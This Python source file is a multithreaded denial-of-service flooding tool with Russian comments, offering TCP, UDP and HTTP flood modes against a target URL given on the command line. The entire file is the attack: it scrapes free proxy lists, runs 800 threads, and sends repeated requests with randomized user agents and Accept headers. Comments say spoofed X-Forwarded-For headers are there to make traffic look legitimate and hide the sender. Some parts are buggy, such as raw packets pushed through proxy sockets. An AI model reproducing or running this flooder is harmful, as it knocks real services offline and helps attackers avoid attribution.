# -*- coding: utf-8 -*-
import urllib.request
import sys
from scapy.all import *
# Импортируем либы
import socket
import socks
import argparse
import threading
import random
import time


__author__ = "Жмышенко Валерий Альбертович 54 года"
sites = ["https://www.socks-proxy.net/","http://free-proxy-list.net/"] #Сайты откуда берем прокси
useragents = []
##Мощность DoS-а зависит от вашего интернет соеденения!!!
multiple = 50 # Умножение, значение можно менять
threads = 800 # Кол-во потоков, можно менять
choice1 = 0 #Для настройки типа флуда
choice2 = 0 #Для настройки типа флуда
choice3 = 0 #Для настройки типа флуда
port = 80 # Порт куда будут слаться запросы, можно менять

##### Добавляем в программу аргументы
parser = argparse.ArgumentParser()
parser.add_argument('-useragent', help = 'Путь до файла с user-агентами')
parser.add_argument('-proxylist', help = 'Путь до файла с proxy')
parser.add_argument('-url', help = 'Цель')
parser.add_argument('-getproxy', help = 'Получить прокси? 1 - да | 0 - нет')
args = parser.parse_args()
useragents_file = args.useragent
needproxy = args.getproxy
url = args.url
proxies_list = args.proxylist

###### Получение юзер агента с файла
handle = open("C:\\Users\\Папа\\Desktop\\Новая папка\\useragents.txt")
for x in handle:
    useragents.append(x)
useragents = map(lambda s: s.strip(), useragents)
useragents = list(useragents)
######

def getPROXY(urlproxy):
    try:
        req = urllib.request.Request(("{0}").format(str(urlproxy)))
        req.add_header("User-Agent", random.choice(useragents))
        sourcecode = urllib.request.urlopen(req)
        part = str(sourcecode.read())
        part = part.split("<tbody>")
        part = part[1].split("</tbody>")
        part = part[0].split("<tr><td>")
        proxies = ""
        for proxy in part:
            proxy = proxy.split("</td><td>") #Получаем прокси с сайта путем разделения тегов
            try:
                proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
            except:
                pass
        handle = open("proxy.txt","a") #Записуем полученные прокси в файл
        handle.write("")
        handle.write(proxies)
        handle.close()
        print ("Прокси скачаны успешно!")
    except Exception as e:
        print ("Ошибка! " + e)

if needproxy == "1": # Нужно ли качать прокси?
    #### Получение проксей
    for x in sites:
        getPROXY(x)
    ####
time.sleep(5)
if proxies_list == "": # Если прокси не указана закрыть программу
    print("Укажи прокси!")
    exit()
if useragents_file == "": # Если useragent-ы не указаны закрыть программу
    print("Укажи useragent-ов!")
    exit()
try:
    proxies = open(proxies_list).readlines() # Читаем прокси
except TypeError:
    print("Прокси с файла не считаны!")
#####




def checkURL(): #Редактируем URL
    global url
    global url2
    global urlport


    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
    except:
        print("Ошибка URL!")
        exit()

    try:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

    try:
        urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
    except:
        urlport = "19132"



def typeflood(): # Определяем тип флуда
    global choice1 #Для сайтов самы сильный - HTTP
    global choice2
    global choice3

    select = input("UDP или TCP или HTTP? => ")
    if select == "TCP":
        choice1 = "1" # Изначально программа была в интерактивном режиме
        choice2 = "y" # Но я убрал его, оставив лишь выбор метода флуда
        choice3 = "0" # Поэтому переменные называются choice))
    if select == "UDP":
        choice1 = "2"
        choice2 = "y" #Тестить мощь ваше DoS-а или DDoS-а можно здесь: https://www.vedbex.com/tools/dstat
        choice3 = "0"
    if select == "HTTP":
        choice1 = "0"
        choice2 = "y"
        choice3 = "0"


def loop():
    global threads
    global get_host
    global acceptall
    global connection
    global go
    global x

    if choice1 == "0": # прописуем  заголовки, чтобы не нагружать потоки
        get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        ] # заголовок Accept передается случайным образом, чтобы запросы казались легимитными
        connection = "Connection: Keep-Alive\r\n" #
    x = 0 # для счета
    go = threading.Event()
    if choice1 == "1": # Выбираем TCP флуд
        if choice2 == "y":
            if choice3 == "0":
                for x in range(threads):
                    TcpFloodProxed(x+1).start() # запуск класса
                    print ("Поток " + str(x) + " готов!")
                go.set() # Запуск потоков, как только они все будут готовы
    else: # Выбираем UDP флуд
        if choice1 == "2":
            if choice2 == "y":
                if choice3 == "0":
                    for x in range(threads):
                        UdpFloodProxed(x+1).start() # запуск класса
                        print ("Поток " + str(x) + " готов!")
                    go.set() # Запуск потоков, как только они все будут готовы
        else: # Выбираем HTTP флуд
            if choice2 == "y":
                if choice3 == "0":
                    for x in range(threads):
                        RequestProxyHTTP(x+1).start() # запуск класса
                        print ("Поток " + str(x) + " готов!")
                    go.set() # Запуск потоков, как только они все будут готовы



class TcpFloodProxed(threading.Thread): # класс многопоточности

    def __init__(self, counter): # функция вызывается практически только на счетчик потоков. Параметр счетчика функции, передает x + 1 выше в качестве счетной переменной
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): # функция, которая дает инструкции для  потоков
        data = random._urandom(1024) # рандомная дата для пакета
        p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # построение пакета tcp + data
        current = x # текущий поток
        if current < len(proxies): # если  поток может  связаться с прокси, этот прокси используется
            proxy = proxies[current].strip().split(':')
        else: # в противном случае выбирается другое прокси
            proxy = random.choice(proxies).strip().split(":")
        go.wait() # ожидание, пока все прокси будут готовы
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # команда для HTTP-проксирования
                s = socks.socksocket() # создание сокета
                s.connect((str(url2),int(port))) # подключение
                s.send(p) # отправка
                print ("Запрос отправлен с " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) # вывод req + counter
                try: # отправлять другие запросы в этом же потоке
                    for y in range(multiple): # коэффициент умножения
                        s.send(str.encode(p)) # кодируем запрос в байты
                except: # если что-то пойдет не так, сокет закроется, и цикл снова запустится
                    s.close()
            except:
                s.close() # если что-то пойдет не так, закрыть поток и начать заного


class UdpFloodProxed(threading.Thread):  # класс многопоточности

    def __init__(self, counter): # функция вызывается практически только на счетчик потоков. Параметр счетчика функции, передает x + 1 выше в качестве счетной переменной
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): # функция, которая дает инструкции для  потоков
        data = random._urandom(1024) # рандомная дата для пакета
        p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data)  # построение пакета udp (классика)
        current = x # текущий поток
        if current < len(proxies): # если  поток может  связаться с прокси, этот прокси используется
            proxy = proxies[current].strip().split(':')
        else: # в противном случае выбирается другое прокси
            proxy = random.choice(proxies).strip().split(":")
        go.wait() # ожидание, пока все прокси будут готовы
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # команда для HTTP-проксирования
                s = socks.socksocket() # создание сокета
                s.connect((str(url2),int(port))) # подключение
                s.send(p) # отправка
                print ("Запрос отправлен с " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) # вывод req + counter
                try: # отправлять другие запросы в этом же потоке
                    for y in range(multiple): # коэффициент умножения
                        s.send(str.encode(p)) # кодируем запрос в байты
                except: # если что-то пойдет не так, сокет закроется, и цикл снова запустится
                    s.close()
            except:
                s.close() # если что-то пойдет не так, закрыть поток и начать заного

class RequestProxyHTTP(threading.Thread): # класс многопоточности

    def __init__(self, counter): # функция вызывается практически только на счетчик потоков. Параметр счетчика функции, передает x + 1 выше в качестве счетной переменной
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): # функция, которая дает инструкции для  потоков
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # выбор рандомного useragent-а
        accept = random.choice(acceptall) # выбор рандомного заголовка "Accept"
        randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For добавляем заголовок, который повысит нам анонимность
        request = get_host + useragent + accept + forward + connection + "\r\n" # создаем конечный запрос
        current = x # текущий поток
        if current < len(proxies): # если  поток может  связаться с прокси, этот прокси используется
            proxy = proxies[current].strip().split(':')
        else:  # в противном случае выбирается другое прокси
            proxy = random.choice(proxies).strip().split(":")
        go.wait() # ожидание, пока все прокси будут готовы
        while True: # бесконечный цикл
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # создаем сокет
                s.connect((str(proxy[0]), int(proxy[1]))) # конектимся к прокси
                s.send(str.encode(request)) # кодируем запрос в байты
                print ("Запрос отправлен с " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) # вывод req + counter
                try: # отправлять другие запросы в этом же потоке
                    for y in range(multiple): # коэффициент умножения
                        s.send(str.encode(request)) # кодируем запрос в байты
                except: # если что-то пойдет не так, сокет закроется, и цикл снова запустится
                    s.close()
            except:
                s.close() # если что-то пойдет не так, закрыть поток и начать заного




if __name__ == '__main__': # Если программа запущена как самостоятельная, то запускаем эти функции
    checkURL()
    typeflood()
    loop()